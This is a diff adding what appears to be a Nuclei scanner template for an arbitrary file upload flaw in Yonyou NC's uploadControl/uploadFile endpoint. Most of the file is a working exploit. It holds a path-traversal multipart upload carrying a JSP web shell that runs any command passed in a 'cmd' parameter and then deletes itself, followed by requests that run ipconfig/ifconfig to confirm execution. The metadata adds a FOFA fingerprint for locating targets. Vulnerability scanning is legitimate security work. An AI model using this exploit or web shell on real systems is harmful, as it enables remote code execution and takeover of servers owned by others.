@@ -1,0 +1,49 @@
+http:
+    - raw:
+        - |
+          POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+
+          ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+          Content-Disposition: form-data; name="file"; filename="test.jsp"
+          Content-Type: image/jpeg
+
+          <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+          ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+          Content-Disposition: form-data; name="submit"
+
+          上传
+          ------WebKitFormBoundaryHHaZAYecVOf5sfa6--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Windows IP
+            - eth0
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /mp/uploadFileDir/test.jsp?cmd=ipconfig HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /mp/uploadFileDir/test.jsp?cmd=ifconfig HTTP/1.1
+          Host: {{Hostname}}
+id: yongyouNC-uploadControl-uploadFile-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="1085941792"
+        用友 NC uploadControl/uploadFile 接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 用友 NC uploadControl/uploadFile 文件上传
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/139666069
+    severity: high
+    tags:
+        - NITC
+        - nitc
+        - Servlet
